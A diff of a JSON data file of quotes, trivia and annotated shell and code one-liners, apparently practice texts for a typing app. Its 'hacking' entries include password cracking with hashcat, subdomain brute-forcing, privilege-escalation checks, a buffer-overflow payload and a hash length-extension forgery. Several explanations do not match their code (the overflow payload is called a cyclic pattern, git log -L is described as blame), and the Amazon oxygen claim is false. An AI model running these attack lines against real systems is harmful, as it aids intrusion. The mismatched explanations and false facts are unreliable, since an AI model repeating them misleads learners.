+    "content": "To be ignorant of what occurred before you were born is to remain always a child.",
+    "attribution": "Cicero"
+  },
+  {
+    "category": "business",
+    "content": "Success breeds complacency. Complacency breeds failure. Only the paranoid survive.",
+    "attribution": "Andy Grove, Only the Paranoid Survive"
+  },
+  {
+    "category": "technology",
+    "content": "Design is not just what it looks like and feels like. Design is how it works.",
+    "attribution": "Steve Jobs"
+  },
+  {
+    "category": "nature",
+    "content": "There lives the dearest freshness deep down things.",
+    "attribution": "Gerard Manley Hopkins, God's Grandeur"
   },
   {
     "category": "programming",
@@ -839,31 +174,46 @@
   },
   {
     "category": "hacking",
-    "content": "iptables -P INPUT DROP && iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT",
-    "attribution": "Defence",
+    "content": "hashcat -m 0 -a 0 hashes.txt rockyou.txt --force",
+    "attribution": "Crypto",
     "language": "shell",
-    "explanation": "Blocks everything inbound by default and allows what is needed back. A deny-by-default policy is the only kind worth writing."
+    "explanation": "An MD5 of a known-weak hash type. Modern password hashing exists because this takes seconds, not years."
+  },
+  {
+    "category": "movies",
+    "content": "My mama always said life was like a box of chocolates. You never know what you're gonna get.",
+    "attribution": "Forrest Gump (1994)"
+  },
+  {
+    "category": "quotes",
+    "content": "The two most important days in your life are the day you are born and the day you find out why.",
+    "attribution": "Mark Twain"
+  },
+  {
+    "category": "business",
+    "content": "A bad system will beat a good person every time.",
+    "attribution": "W. Edwards Deming"
+  },
+  {
+    "category": "history",
+    "content": "That's one small step for a man, one giant leap for mankind.",
+    "attribution": "Neil Armstrong, 1969"
+  },
+  {
+    "category": "programming",
+    "content": "const total = items.reduce((acc, item) => acc + item.price, 0);",
+    "attribution": "JavaScript",
+    "language": "javascript",
+    "explanation": "reduce walks the array carrying a running value. The 0 is the starting total; drop it and an empty array throws."
   },
   {
     "category": "general",
-    "content": "Simplicity is the soul of efficiency."
-  },
-  {
-    "category": "sysadmin",
-    "content": "ssh -N -L 5432:127.0.0.1:5432 dbhost",
-    "attribution": "SSH",
-    "language": "shell",
-    "explanation": "Forwards a remote port to the local machine, so a service bound to localhost on the server is reachable here."
-  },
-  {
-    "category": "philosophy",
-    "content": "It's not what happens to you, but how you react to it that matters.",
-    "attribution": "Epictetus"
+    "content": "A group of flamingos is called a flamboyance. The birds get their pink color from the pigments in the shrimp and algae they eat."
   },
   {
     "category": "anime",
-    "content": "Whatever happens, happens.",
-    "attribution": "Cowboy Bebop"
+    "content": "Even if you can't see it, the river keeps flowing under the ice.",
+    "attribution": "March Comes in Like a Lion"
   },
   {
     "category": "hacking",
@@ -873,346 +223,9 @@
     "explanation": "Requests a path with an absolute URL to see whether the proxy in front trusts it. A different response here often means an internal service is reachable."
   },
   {
-    "category": "philosophy",
-    "content": "A journey of a thousand miles begins with a single step.",
-    "attribution": "Lao Tzu, Tao Te Ching"
-  },
-  {
-    "category": "hacking",
-    "content": "gobuster dns -d example.com -w /usr/share/wordlists/subdomains.txt -t 40",
-    "attribution": "Recon",
-    "language": "shell",
-    "explanation": "Resolves a wordlist of names against a domain. Subdomains are where forgotten staging boxes live."
-  },
-  {
-    "category": "programming",
-    "content": "counts = {word: text.count(word) for word in set(text.split())}",
-    "attribution": "Python",
-    "language": "python",
-    "explanation": "A dict comprehension. Note it is quadratic: count rescans the whole string per word. collections.Counter is the right tool."
-  },
-  {
-    "category": "programming",
-    "content": "for name, score in zip(names, scores, strict=True): print(f'{name}: {score:>5.1f}')",
-    "attribution": "Python",
-    "language": "python",
-    "explanation": "zip pairs two sequences and stops at the shorter one. strict=True makes a length mismatch an error rather than silent truncation."
-  },
-  {
     "category": "movies",
-    "content": "If you build it, he will come.",
-    "attribution": "Field of Dreams (1989)"
-  },
-  {
-    "category": "business",
-    "content": "It takes twenty years to build a reputation and five minutes to ruin it.",
-    "attribution": "Warren Buffett"
-  },
-  {
-    "category": "technology",
-    "content": "Design is not just what it looks like and feels like. Design is how it works.",
-    "attribution": "Steve Jobs"
-  },
-  {
-    "category": "sysadmin",
-    "content": "dig +short @1.1.1.1 example.com A",
-    "attribution": "Network",
-    "language": "shell",
-    "explanation": "Resolves a name through a specific server, which is how you tell a stale local cache from a stale zone."
-  },
-  {
-    "category": "shell",
-    "content": "cut -d' ' -f1 access.log | sort | uniq -c | sort -rn | head",
-    "attribution": "Pipelines",
-    "language": "shell",
-    "explanation": "uniq only collapses adjacent duplicates, which is why sort comes first. -c counts, and the second sort orders by that count."
-  },
-  {
-    "category": "philosophy",
-    "content": "It is not that we have a short time to live, but that we waste a lot of it.",
-    "attribution": "Seneca, On the Shortness of Life"
-  },
-  {
-    "category": "anime",
-    "content": "Overspecialize, and you breed in weakness. It's slow death.",
-    "attribution": "Ghost in the Shell"
-  },
-  {
-    "category": "literature",
-    "content": "In my younger and more vulnerable years my father gave me some advice that I've been turning over in my mind ever since. Whenever you feel like criticizing anyone, he told me, just remember that all the people in this world haven't had the advantages that you've had.",
-    "attribution": "F. Scott Fitzgerald, The Great Gatsby"
-  },
-  {
-    "category": "science",
-    "content": "The Analytical Engine weaves algebraical patterns just as the Jacquard loom weaves flowers and leaves.",
-    "attribution": "Ada Lovelace"
-  },
-  {
-    "category": "technology",
-    "content": "Simplicity is prerequisite for reliability.",
-    "attribution": "Edsger Dijkstra"
-  },
-  {
-    "category": "sysadmin",
-    "content": "ps -eo pid,user,rss,pcpu,comm --sort=-rss | head -12",
-    "attribution": "Processes",
-    "language": "shell",
-    "explanation": "The heaviest processes by resident memory. --sort takes a minus for descending order."
-  },
-  {
-    "category": "programming",
-    "content": "git log -L 40,60:src/parser.rs --oneline",
-    "attribution": "Git",
-    "language": "shell",
-    "explanation": "Who last touched each line of a range, which is how you find the person to ask rather than the person to blame."
-  },
-  {
-    "category": "anime",
-    "content": "If you don't take risks, you can't create a future.",
-    "attribution": "One Piece"
-  },
-  {
-    "category": "sysadmin",
-    "content": "ss -ltnp | awk 'NR>1 {print $4, $6}'",
-    "attribution": "Network",
-    "language": "shell",
-    "explanation": "Listening sockets with the process behind each one. The modern replacement for netstat -tulpn."
-  },
-  {
-    "category": "history",
-    "content": "Those who cannot remember the past are condemned to repeat it.",
-    "attribution": "George Santayana, The Life of Reason"
-  },
-  {
-    "category": "history",
-    "content": "You have to make more noise than anybody else, you have to fill all the papers more than anybody else.",
-    "attribution": "Emmeline Pankhurst, 1913"
-  },
-  {
-    "category": "literature",
-    "content": "To Sherlock Holmes she is always the woman. I have seldom heard him mention her under any other name. In his eyes she eclipses and predominates the whole of her sex.",
-    "attribution": "Arthur Conan Doyle, A Scandal in Bohemia"
-  },
-  {
-    "category": "hacking",
-    "content": "sudo -l 2>/dev/null | grep -E 'NOPASSWD|\\(ALL\\)'",
-    "attribution": "Post-exploitation",
-    "language": "shell",
-    "explanation": "Lists what the current user may run as root. A single entry with NOPASSWD is often the whole path to root."
-  },
-  {
-    "category": "anime",
-    "content": "Humankind cannot gain anything without first giving something in return. To obtain, something of equal value must be lost.",
-    "attribution": "Fullmetal Alchemist"
-  },
-  {
-    "category": "movies",
-    "content": "What we do in life echoes in eternity.",
-    "attribution": "Gladiator (2000)"
-  },
-  {
-    "category": "hacking",
-    "content": "grep -rE '^[^#].*(ALL|NOPASSWD)' /etc/sudoers /etc/sudoers.d/ 2>/dev/null",
-    "attribution": "Defence",
-    "language": "shell",
-    "explanation": "Audits which accounts can escalate, and how. The answer is usually longer than anyone expects."
-  },
-  {
-    "category": "anime",
-    "content": "When you look at someone's kindness, it's like looking at the sun.",
-    "attribution": "Fruits Basket"
-  },
-  {
-    "category": "history",
-    "content": "Power concedes nothing without a demand. It never did and it never will.",
-    "attribution": "Frederick Douglass, 1857"
-  },
-  {
-    "category": "hacking",
-    "content": "curl -s 'https://target/?x=1' -H 'X-Forwarded-Scheme: nothttps' -o /dev/null -w '%{http_code} %{time_total}\\n'",
-    "attribution": "Web",
-    "language": "shell",
-    "explanation": "Requests the same path twice with different cache-busting keys to see whether a proxy will serve one user's response to another."
-  },
-  {
-    "category": "literature",
-    "content": "1801. I have just returned from a visit to my landlord, the solitary neighbour that I shall be troubled with. This is certainly a beautiful country. In all England, I do not believe that I could have fixed on a situation so completely removed from the stir of society.",
-    "attribution": "Emily Bronte, Wuthering Heights"
-  },
-  {
-    "category": "nature",
-    "content": "When we try to pick out anything by itself, we find it hitched to everything else in the universe.",
-    "attribution": "John Muir, My First Summer in the Sierra"
-  },
-  {
-    "category": "programming",
-    "content": "match result { Ok(v) => println!(\"{v}\"), Err(e) => eprintln!(\"error: {e}\") }",
-    "attribution": "Rust",
-    "language": "rust",
-    "explanation": "match on a Result must cover both arms - the compiler rejects it otherwise, which is how Rust stops an error going unhandled."
-  },
-  {
-    "category": "programming",
-    "content": "export PATH=\"$HOME/.local/bin:$PATH\" && command -v rg >/dev/null || echo missing",
-    "attribution": "Shell",
-    "language": "shell",
-    "explanation": "Prepending puts your own binaries ahead of the system ones. command -v is the portable test for whether something is installed."
-  },
-  {
-    "category": "nature",
-    "content": "In some Native languages the term for plants translates to those who take care of us.",
-    "attribution": "Robin Wall Kimmerer, Braiding Sweetgrass"
-  },
-  {
-    "category": "programming",
-    "content": "let mut counts: HashMap<String, usize> = HashMap::new();",
-    "attribution": "Rust",
-    "language": "rust",
-    "explanation": "mut because inserting mutates it. The type annotation is needed here since nothing yet tells the compiler what it holds."
-  },
-  {
-    "category": "business",
-    "content": "When a measure becomes a target, it ceases to be a good measure.",
-    "attribution": "Goodhart's Law"
-  },
-  {
-    "category": "quotes",
-    "content": "That man over there says that women need to be helped into carriages, and lifted over ditches, and to have the best place everywhere. Nobody ever helps me into carriages, or over mud puddles, or gives me any best place, and ain't I a woman?",
-    "attribution": "Sojourner Truth, Ain't I a Woman?"
-  },
-  {
-    "category": "anime",
-    "content": "The only thing we're allowed to do is to believe that we won't regret the choice we made.",
-    "attribution": "Attack on Titan"
-  },
-  {
-    "category": "shell",
-    "content": "awk '{print $1, $NF}' access.log",
-    "attribution": "awk",
-    "language": "shell",
-    "explanation": "awk splits each line into fields on whitespace. $1 is the first, $NF the last - so this prints the first and last column of every line."
-  },
-  {
-    "category": "shell",
-    "content": "tmp=$(mktemp -d) && trap 'rm -rf \"$tmp\"' EXIT",
-    "attribution": "Shell safety",
-    "language": "shell",
-    "explanation": "A trap on EXIT cleans up whether the script succeeded, failed or was interrupted."
-  },
-  {
-    "category": "nature",
-    "content": "A thing is right when it tends to preserve the integrity, stability and beauty of the biotic community.",
-    "attribution": "Aldo Leopold, A Sand County Almanac"
-  },
-  {
-    "category": "literature",
-    "content": "It was on a dreary night of November that I beheld the accomplishment of my toils. With an anxiety that almost amounted to agony, I collected the instruments of life around me, that I might infuse a spark of being into the lifeless thing that lay at my feet.",
-    "attribution": "Mary Shelley, Frankenstein"
-  },
-  {
-    "category": "movies",
-    "content": "You're gonna need a bigger boat.",
-    "attribution": "Jaws (1975)"
-  },
-  {
-    "category": "history",
-    "content": "Injustice anywhere is a threat to justice everywhere.",
-    "attribution": "Martin Luther King Jr., Letter from Birmingham Jail, 1963"
-  },
-  {
-    "category": "programming",
-    "content": "int *buf = malloc(len * sizeof(int)); if (!buf) return -1;",
-    "attribution": "C",
-    "language": "clike",
-    "explanation": "malloc returns NULL when it fails, and checking is not optional. sizeof(int) rather than 4 keeps it correct across platforms."
-  },
-  {
-    "category": "programming",
-    "content": "fn main() { println!(\"{}\", args().skip(1).collect::<Vec<_>>().join(\" \")); }",
-    "attribution": "Rust",
-    "language": "rust",
-    "explanation": "skip(1) drops the program name, which is always the first argument. Vec<_> lets the compiler infer the element type."
-  },
-  {
-    "category": "literature",
-    "content": "There was no possibility of taking a walk that day. We had been wandering, indeed, in the leafless shrubbery an hour in the morning, but since dinner the cold winter wind had brought with it clouds so sombre, and a rain so penetrating.",
-    "attribution": "Charlotte Bronte, Jane Eyre"
-  },
-  {
-    "category": "business",
-    "content": "The essence of strategy is choosing what not to do.",
-    "attribution": "Michael Porter"
-  },
-  {
-    "category": "programming",
-    "content": "groups = defaultdict(list); [groups[w[0]].append(w) for w in words]",
-    "attribution": "Python",
-    "language": "python",
-    "explanation": "defaultdict removes the exists-check before every append, which is the most common shape of a grouping loop."
-  },
-  {
-    "category": "programming",
-    "content": "EXPLAIN ANALYZE SELECT * FROM test_results WHERE mode_key = 'time-30' ORDER BY wpm DESC LIMIT 50;",
-    "attribution": "SQL",
-    "language": "clike",
-    "explanation": "EXPLAIN ANALYZE runs the query and reports what the planner actually did, not what it guessed it would do."
-  },
-  {
-    "category": "philosophy",
-    "content": "The beginning is the most important part of the work.",
-    "attribution": "Plato, The Republic"
-  },
-  {
-    "category": "nature",
-    "content": "The mountains are calling and I must go.",
-    "attribution": "John Muir"
-  },
-  {
-    "category": "philosophy",
-    "content": "The Socratic method uses a series of questions and answers to expose contradictions in a person's beliefs, encouraging deeper critical thinking rather than simply providing answers."
-  },
-  {
-    "category": "anime",
-    "content": "Even if you can't see it, the river keeps flowing under the ice.",
-    "attribution": "March Comes in Like a Lion"
-  },
-  {
-    "category": "sysadmin",
-    "content": "tar czf - /var/www | ssh backup 'cat > www-$(date +%F).tar.gz'",
-    "attribution": "Backup",
-    "language": "shell",
-    "explanation": "Streams a directory to another host without a temporary archive on either side."
-  },
-  {
-    "category": "anime",
-    "content": "The only ones who should kill are those who are prepared to be killed.",
-    "attribution": "Code Geass"
-  },
-  {
-    "category": "shell",
-    "content": "cut -f2 data.tsv | paste -sd, -",
-    "attribution": "Text processing",
-    "language": "shell",
-    "explanation": "paste joins lines side by side; -s -d joins them all into one line with the chosen separator."
-  },
-  {
-    "category": "movies",
-    "content": "I'm as mad as hell, and I'm not going to take this anymore.",
-    "attribution": "Network (1976)"
-  },
-  {
-    "category": "literature",
-    "content": "Christmas won't be Christmas without any presents, grumbled Jo, lying on the rug. It's so dreadful to be poor, sighed Meg, looking down at her old dress.",
-    "attribution": "Louisa May Alcott, Little Women"
-  },
-  {
-    "category": "general",
-    "content": "The invention of the printing press in the fifteenth century transformed how knowledge spread across Europe. Books that once took months to copy by hand could suddenly be reproduced by the hundreds, making literacy far more accessible."
-  },
-  {
-    "category": "nature",
-    "content": "It seems to me that the natural world is the greatest source of excitement, of visual beauty, of intellectual interest.",
-    "attribution": "David Attenborough"
+    "content": "The greatest trick the devil ever pulled was convincing the world he didn't exist.",
+    "attribution": "The Usual Suspects (1995)"
   },
   {
     "category": "sysadmin",
@@ -1222,207 +235,18 @@
     "explanation": "Largest directories at this level, human readable. -x stays on one filesystem so it does not wander into /proc or a mount."
   },
   {
-    "category": "movies",
-    "content": "Do. Or do not. There is no try.",
-    "attribution": "The Empire Strikes Back (1980)"
-  },
-  {
-    "category": "sysadmin",
-    "content": "systemctl --failed --no-pager",
-    "attribution": "systemd",
-    "language": "shell",
-    "explanation": "Lists units that failed at boot. The first thing to run on a machine that came up wrong."
-  },
-  {
-    "category": "movies",
-    "content": "Of all the gin joints in all the towns in all the world, she walks into mine.",
-    "attribution": "Casablanca (1942)"
-  },
-  {
-    "category": "programming",
-    "content": "for f in *.log; do gzip -9 \"$f\" && echo \"packed $f\"; done",
-    "attribution": "Shell",
-    "language": "shell",
-    "explanation": "The quotes around $f matter: without them a filename containing a space becomes two arguments."
-  },
-  {
-    "category": "shell",
-    "content": "awk -F: '{print $1, $7}' /etc/passwd",
-    "attribution": "awk",
-    "language": "shell",
-    "explanation": "-F sets the field separator. This reads /etc/passwd and prints the username and shell, which are fields 1 and 7."
-  },
-  {
-    "category": "history",
-    "content": "We shall fight on the beaches, we shall fight on the landing grounds, we shall fight in the fields and in the streets.",
-    "attribution": "Winston Churchill, 1940"
-  },
-  {
-    "category": "shell",
-    "content": "awk '$9 == 404 {print $7}' access.log | sort | uniq -c | sort -rn",
-    "attribution": "awk",
-    "language": "shell",
-    "explanation": "A pattern before the block acts as a filter: only lines whose 9th field is 404 are printed. No grep needed."
-  },
-  {
-    "category": "literature",
-    "content": "Mr. Sherlock Holmes, who was usually very late in the mornings, save upon those not infrequent occasions when he was up all night, was seated at the breakfast table.",
-    "attribution": "Arthur Conan Doyle, The Hound of the Baskervilles"
-  },
-  {
-    "category": "shell",
-    "content": "awk '{sum += $3} END {print sum, sum/NR}' numbers.txt",
-    "attribution": "awk",
-    "language": "shell",
-    "explanation": "Sums a column and prints the average. END runs after the last line, so NR is the total row count by then."
-  },
-  {
-    "category": "business",
-    "content": "Every moment in business happens only once. The next Bill Gates will not build an operating system.",
-    "attribution": "Peter Thiel, Zero to One"
-  },
-  {
-    "category": "history",
-    "content": "The world will little note nor long remember what we say here, but it can never forget what they did here.",
-    "attribution": "Abraham Lincoln, Gettysburg Address, 1863"
-  },
-  {
-    "category": "nature",
-    "content": "Those who contemplate the beauty of the earth find reserves of strength that will endure as long as life lasts.",
-    "attribution": "Rachel Carson, The Sense of Wonder"
-  },
-  {
-    "category": "philosophy",
-    "content": "Existentialism explores questions about individual freedom, choice, and meaning, arguing that people must create their own purpose in a universe that does not provide one automatically."
-  },
-  {
     "category": "hacking",
-    "content": "curl -s 'https://crt.sh/?q=%25.example.com&output=json' | jq -r '.[].name_value' | sort -u",
+    "content": "gobuster dns -d example.com -w /usr/share/wordlists/subdomains.txt -t 40",
     "attribution": "Recon",
     "language": "shell",
-    "explanation": "Certificate transparency logs list every name a CA has issued for a domain, including hosts that were never meant to be public."
-  },
-  {
-    "category": "science",
-    "content": "What we observe is not nature itself, but nature exposed to our method of questioning.",
-    "attribution": "Werner Heisenberg"
-  },
-  {
-    "category": "shell",
-    "content": "sed -n '10,20p' large.log",
-    "attribution": "sed",
-    "language": "shell",
-    "explanation": "Prints only lines 10 to 20. -n suppresses the default print, and p prints the range that matched."
-  },
-  {
-    "category": "science",
-    "content": "I would rather have questions that can't be answered than answers that can't be questioned.",
-    "attribution": "Richard Feynman"
-  },
-  {
-    "category": "movies",
-    "content": "You mustn't be afraid to dream a little bigger, darling.",
-    "attribution": "Inception (2010)"
-  },
-  {
-    "category": "general",
-    "content": "Octopuses have three hearts and blue blood. Two of the hearts pump blood to the gills, while the third circulates it to the rest of the body, and the blue color comes from a copper-based protein instead of iron."
-  },
-  {
-    "category": "shell",
-    "content": "awk '!seen[$0]++' file.txt",
-    "attribution": "awk",
-    "language": "shell",
-    "explanation": "Deduplicate without sorting, preserving original order. The array records what has been seen; !seen[$0]++ is true only the first time."
-  },
-  {
-    "category": "literature",
-    "content": "Not all those who wander are lost.",
-    "attribution": "J.R.R. Tolkien"
-  },
-  {
-    "category": "science",
-    "content": "Imagination is more important than knowledge. Knowledge is limited. Imagination encircles the world.",
-    "attribution": "Albert Einstein"
-  },
-  {
-    "category": "anime",
-    "content": "If you win, you live. If you lose, you die. If you don't fight, you can't win.",
-    "attribution": "Attack on Titan"
-  },
-  {
-    "category": "science",
-    "content": "The whole history of science has been the gradual realisation that events do not happen in an arbitrary manner.",
-    "attribution": "Stephen Hawking, A Brief History of Time"
-  },
-  {
-    "category": "general",
-    "content": "Antarctica is technically the largest desert on the planet. Despite being covered in ice, it receives very little precipitation each year, which is the defining characteristic of a desert rather than temperature alone."
+    "explanation": "Resolves a wordlist of names against a domain. Subdomains are where forgotten staging boxes live."
   },
   {
     "category": "hacking",
-    "content": "openssl s_client -connect target:443 -servername target < /dev/null | openssl x509 -noout -text",
+    "content": "forged = hashlib.sha256(secret_len * b'\\x00' + original + padding + suffix).hexdigest()",
     "attribution": "Crypto",
-    "language": "shell",
-    "explanation": "Reads the certificate a host presents. Expiry dates and hostname mismatches are found here, not in a browser warning."
-  },
-  {
-    "category": "movies",
-    "content": "We used to look up at the sky and wonder at our place in the stars. Now we just look down and worry about our place in the dirt.",
-    "attribution": "Interstellar (2014)"
-  },
-  {
-    "category": "technology",
-    "content": "All problems in computer science can be solved by another level of indirection.",
-    "attribution": "Butler Lampson"
-  },
-  {
-    "category": "programming",
-    "content": "const { id, name = 'anonymous', ...rest } = await request.json();",
-    "attribution": "JavaScript",
-    "language": "javascript",
-    "explanation": "Destructuring with a default and a rest property. The default applies only when the value is undefined, not when it is null."
-  },
-  {
-    "category": "science",
-    "content": "Nothing in life is to be feared, it is only to be understood. Now is the time to understand more, so that we may fear less.",
-    "attribution": "Marie Curie"
-  },
-  {
-    "category": "sysadmin",
-    "content": "strace -c -f -p $PID 2>&1 | tail -20",
-    "attribution": "Processes",
-    "language": "shell",
-    "explanation": "Traces the system calls a command makes, with a count and timing summary rather than a wall of output."
-  },
-  {
-    "category": "technology",
-    "content": "Any sufficiently advanced technology is indistinguishable from magic.",
-    "attribution": "Arthur C. Clarke"
-  },
-  {
-    "category": "technology",
-    "content": "The human mind operates by association. With one item in its grasp, it snaps instantly to the next that is suggested.",
-    "attribution": "Vannevar Bush, As We May Think"
-  },
-  {
-    "category": "sysadmin",
-    "content": "rsync -avhn --delete /src/ /dest/",
-    "attribution": "Backup",
-    "language": "shell",
-    "explanation": "Mirrors a tree, deletes what no longer exists on the source, and shows what it would do first. Never run this without -n the first time."
-  },
-  {
-    "category": "quotes",
-    "content": "You have power over your mind, not outside events. Realize this, and you will find strength.",
-    "attribution": "Marcus Aurelius, Meditations"
-  },
-  {
-    "category": "hacking",
-    "content": "getcap -r / 2>/dev/null | grep -E 'cap_(setuid|dac_override|sys_admin)'",
-    "attribution": "Post-exploitation",
-    "language": "shell",
-    "explanation": "Capabilities are finer-grained than setuid but grant real power. cap_setuid on an interpreter is root."
+    "language": "python",
+    "explanation": "A length-extension attack works because the hash's internal state is its output. HMAC exists precisely to stop this."
   },
   {
     "category": "literature",
@@ -1430,382 +254,12 @@
     "attribution": "Jules Verne, Twenty Thousand Leagues Under the Sea"
   },
   {
-    "category": "technology",
-    "content": "Security is a process, not a product.",
-    "attribution": "Bruce Schneier"
-  },
-  {
-    "category": "hacking",
-    "content": "curl -sI https://target/login | grep -i 'set-cookie' | grep -ci 'httponly.*secure'",
-    "attribution": "Web",
-    "language": "shell",
-    "explanation": "Checks whether a session cookie carries the flags that stop JavaScript reading it and stop it crossing sites."
-  },
-  {
-    "category": "quotes",
-    "content": "If I have seen further, it is by standing on the shoulders of giants.",
-    "attribution": "Isaac Newton"
-  },
-  {
-    "category": "movies",
-    "content": "My mama always said life was like a box of chocolates. You never know what you're gonna get.",
-    "attribution": "Forrest Gump (1994)"
-  },
-  {
-    "category": "science",
-    "content": "The most incomprehensible thing about the world is that it is comprehensible.",
-    "attribution": "Albert Einstein"
-  },
-  {
-    "category": "literature",
-    "content": "It was the best of times, it was the worst of times.",
-    "attribution": "Charles Dickens, A Tale of Two Cities"
+    "category": "general",
+    "content": "A day on Venus is longer than its year. The planet rotates so slowly on its axis that it takes longer to spin around once than it does to complete an entire orbit around the sun."
   },
   {
     "category": "philosophy",
-    "content": "I think, therefore I am.",
-    "attribution": "Rene Descartes, Discourse on the Method"
-  },
-  {
-    "category": "quotes",
-    "content": "It is not the critic who counts; not the man who points out how the strong man stumbles. The credit belongs to the man who is actually in the arena, whose face is marred by dust and sweat and blood.",
-    "attribution": "Theodore Roosevelt, Citizenship in a Republic"
-  },
-  {
-    "category": "general",
-    "content": "The first computer programmer is widely considered to be Ada Lovelace, who wrote an algorithm for an early mechanical computer in the eighteen forties, decades before any machine capable of running it was ever built."
-  },
-  {
-    "category": "programming",
-    "content": "let total: i64 = values.iter().filter(|v| **v > 0).sum();",
-    "attribution": "Rust",
-    "language": "rust",
-    "explanation": "iter() borrows rather than consuming. The double deref is because filter hands you a reference to the iterator's own reference."
-  },
-  {
-    "category": "hacking",
-    "content": "payload = b'A' * 72 + p64(0x401196) + p64(win_addr)",
-    "attribution": "Exploit dev",
-    "language": "python",
-    "explanation": "A cyclic pattern. Whatever four bytes end up in the instruction pointer tell you the exact offset to the return address."
-  },
-  {
-    "category": "sysadmin",
-    "content": "lsof +L1 2>/dev/null | awk '$7 > 100000000 {print $1, $7, $NF}'",
-    "attribution": "Disk",
-    "language": "shell",
-    "explanation": "Finds space held by deleted files that a process still has open. Deleting the file does not free the space until the handle closes."
-  },
-  {
-    "category": "business",
-    "content": "In God we trust; all others must bring data.",
-    "attribution": "W. Edwards Deming"
-  },
-  {
-    "category": "general",
-    "content": "The Amazon rainforest produces roughly twenty percent of the oxygen found in the planet's atmosphere, earning it the nickname the lungs of the Earth."
-  },
-  {
-    "category": "anime",
-    "content": "A heart's a heavy burden.",
-    "attribution": "Howl's Moving Castle"
-  },
-  {
-    "category": "anime",
-    "content": "Hard work is worthless for those that don't believe in themselves.",
-    "attribution": "Naruto"
-  },
-  {
-    "category": "programming",
-    "content": "export async function load(url) { const res = await fetch(url); return res.json(); }",
-    "attribution": "JavaScript",
-    "language": "javascript",
-    "explanation": "fetch resolves as soon as headers arrive, so .json() is a second await for the body. It does not throw on a 404 - check res.ok."
-  },
-  {
-    "category": "technology",
-    "content": "There is no code faster than no code.",
-    "attribution": "Kevlin Henney"
-  },
-  {
-    "category": "history",
-    "content": "I have a dream that my four little children will one day live in a nation where they will not be judged by the colour of their skin.",
-    "attribution": "Martin Luther King Jr., 1963"
-  },
-  {
-    "category": "general",
-    "content": "The Eiffel Tower grows about six inches taller in the summer, as the iron structure expands slightly in the heat and contracts again once the weather cools."
-  },
-  {
-    "category": "literature",
-    "content": "A throng of bearded men, in sad-colored garments and gray, steeple-crowned hats, intermixed with women, some wearing hoods, and others bareheaded, was assembled in front of a wooden edifice.",
-    "attribution": "Nathaniel Hawthorne, The Scarlet Letter"
-  },
-  {
-    "category": "technology",
-    "content": "We are stuck with technology when what we really want is just stuff that works.",
-    "attribution": "Douglas Adams"
-  },
-  {
-    "category": "quotes",
-    "content": "Four score and seven years ago our fathers brought forth on this continent a new nation, conceived in Liberty, and dedicated to the proposition that all men are created equal.",
-    "attribution": "Abraham Lincoln, The Gettysburg Address"
-  },
-  {
-    "category": "sysadmin",
-    "content": "tcpdump -ni any 'tcp[tcpflags] & tcp-syn != 0' -c 20",
-    "attribution": "Network",
-    "language": "shell",
-    "explanation": "Captures the start of connections only. -n skips DNS lookups, which otherwise generate the traffic you are trying to read."
-  },
-  {
-    "category": "general",
-    "content": "A single bolt of lightning can heat the surrounding air to temperatures hotter than the surface of the sun. The rapid expansion of that superheated air is what produces the crack of thunder we hear moments later."
-  },
-  {
-    "category": "general",
-    "content": "Bananas are botanically classified as berries, while strawberries are not. The classification depends on how the fruit develops from the flower, not on taste or size."
-  },
-  {
-    "category": "quotes",
-    "content": "It always seems impossible until it's done.",
-    "attribution": "Nelson Mandela"
-  },
-  {
-    "category": "nature",
-    "content": "In wildness is the preservation of the world.",
-    "attribution": "Henry David Thoreau, Walking"
-  },
-  {
-    "category": "sysadmin",
-    "content": "journalctl -u nginx -n 50 --no-pager -p err",
-    "attribution": "systemd",
-    "language": "shell",
-    "explanation": "Why a unit failed, without paging through the whole journal. -u scopes to the unit, -n limits the lines, --no-pager keeps it in the pipeline."
-  },
-  {
-    "category": "history",
-    "content": "Four score and seven years ago our fathers brought forth on this continent a new nation, conceived in liberty.",
-    "attribution": "Abraham Lincoln, Gettysburg Address, 1863"
-  },
-  {
-    "category": "shell",
-    "content": "sed -e 's/#.*//' -e '/^[[:space:]]*$/d' /etc/ssh/sshd_config",
-    "attribution": "sed",
-    "language": "shell",
-    "explanation": "Deletes comments and blank lines, which is how you read a config that is mostly documentation."
-  },
-  {
-    "category": "science",
-    "content": "What you do makes a difference, and you have to decide what kind of difference you want to make.",
-    "attribution": "Jane Goodall"
-  },
-  {
-    "category": "sysadmin",
-    "content": "systemd-analyze blame | head -15",
-    "attribution": "systemd",
-    "language": "shell",
-    "explanation": "Ranks services by how long they delayed boot. The usual answer to a slow start is one unit near the top."
-  },
-  {
-    "category": "philosophy",
-    "content": "Waste no more time arguing about what a good man should be. Be one.",
-    "attribution": "Marcus Aurelius, Meditations"
-  },
-  {
-    "category": "movies",
-    "content": "I'm gonna make him an offer he can't refuse.",
-    "attribution": "The Godfather (1972)"
-  },
-  {
-    "category": "quotes",
-    "content": "Our greatest glory is not in never falling, but in rising every time we fall.",
-    "attribution": "Confucius"
-  },
-  {
-    "category": "programming",
-    "content": "pub struct Point { pub x: f64, pub y: f64 }",
-    "attribution": "Rust",
-    "language": "rust",
-    "explanation": "Fields are private by default in Rust, so each one needs its own pub - making the struct public does not publish its contents."
-  },
-  {
-    "category": "history",
-    "content": "I could work as much and eat as much as a man, when I could get it, and bear the lash as well. And ain't I a woman?",
-    "attribution": "Sojourner Truth, 1851"
-  },
-  {
-    "category": "programming",
-    "content": "const port = config.port ?? process.env.PORT ?? 8080;",
-    "attribution": "JavaScript",
-    "language": "javascript",
-    "explanation": "?? falls back only on null or undefined, unlike ||, which also fires on 0 and the empty string."
-  },
-  {
-    "category": "nature",
-    "content": "Tell me, what is it you plan to do with your one wild and precious life?",
-    "attribution": "Mary Oliver"
-  },
-  {
-    "category": "hacking",
-    "content": "cur.execute('SELECT * FROM users WHERE name = %s AND active = %s', (name, True))",
-    "attribution": "Defence",
-    "language": "python",
-    "explanation": "Parameterised queries send the values separately from the statement, so nothing the user types can become SQL."
-  },
-  {
-    "category": "movies",
-    "content": "If you could see your whole life laid out in front of you, would you change things?",
-    "attribution": "Arrival (2016)"
-  },
-  {
-    "category": "science",
-    "content": "In the fields of observation chance favours only the prepared mind.",
-    "attribution": "Louis Pasteur"
-  },
-  {
-    "category": "general",
-    "content": "The Great Wall of China was not built all at once. It was constructed and extended over many centuries by different dynasties, each adding new sections and rebuilding older ones to defend against invasions from the north."
-  },
-  {
-    "category": "shell",
-    "content": "make 2>&1 | tee build.log | grep -E 'error|warning'",
-    "attribution": "Pipelines",
-    "language": "shell",
-    "explanation": "tee writes to a file and passes the stream on, so you can log and keep processing in the same pipeline."
-  },
-  {
-    "category": "shell",
